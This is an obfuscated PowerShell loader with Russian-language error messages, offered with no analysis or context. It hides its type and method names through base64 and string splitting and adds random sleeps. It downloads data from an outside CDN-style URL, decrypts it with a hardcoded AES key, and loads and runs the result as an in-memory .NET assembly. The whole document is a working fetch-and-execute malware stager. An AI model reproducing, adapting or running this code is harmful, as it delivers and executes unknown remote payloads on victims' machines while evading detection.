&{
$z1='U3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5BZXM=';
$aesTypeName = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($z1));
$aesType = [Type]::GetType($aesTypeName);
[byte[]]$k1=0x2B,0x7E,0x15,0x16,0x28,0xAE,0xD2,0xA6,0xAB,0xF7,0x15,0x88,0x09,0xCF,0x4F,0x3C;
[byte[]]$k2=0x76,0x2E,0x71,0x60,0xF3,0x8B,0x4D,0xA1,0x6C,0x94,0x0A,0x25,0x8F,0x4A,0x89,0xC7;
$k=[byte[]]($k1+$k2);
[byte[]]$v=0..15;
$w=New-Object ('Net.'+'Web'+'Client');
Start-Sleep -m (Get-Random -Min 100 -Max 300);
try {
    $e=$w.('Down'+'load'+'Data')('https://'+'main'+'45.b'+'-cdn.'+'net'+'/TS'+'ha');
    if ($e.Length -eq 0) { throw 'Пустые данные с URL' }
} catch {
    Write-Host 'Ошибка скачивания: ' $_.Exception.Message;
    return;
}
try {
    $a = $aesType::('Cre'+'ate')();
    $a.('K'+'ey') = $k;
    $a.('I'+'V') = $v;
    $a.('Mo'+'de') = 'C'+'B'+'C';
} catch {
    Write-Host 'Ошибка создания AES: ' $_.Exception.Message;
    return;
}
try {
    $d=$a.('Create'+'Decryptor')();
    $m=New-Object ('IO.Mem'+'ory'+'Stream');
    $c=New-Object ('Security.Cryptog'+'raphy.Crypto'+'Stream')($m,$d,'W'+'rite');
    $c.Write($e,0,$e.Length);
    $c.Close();
} catch {
    Write-Host 'Ошибка дешифровки: ' $_.Exception.Message;
    return;
}
$b=$m.ToArray();
Start-Sleep -m (Get-Random -Min 50 -Max 150);
try {
    [Reflection.Assembly]::('Lo'+'ad')($b).('Entry'+'Point').Invoke($null,@());
} catch {
    Write-Host 'Ошибка выполнения сборки: ' $_.Exception.Message;
}
Read-Host 'Нажми Enter для выхода (проверь ошибки выше)';
}
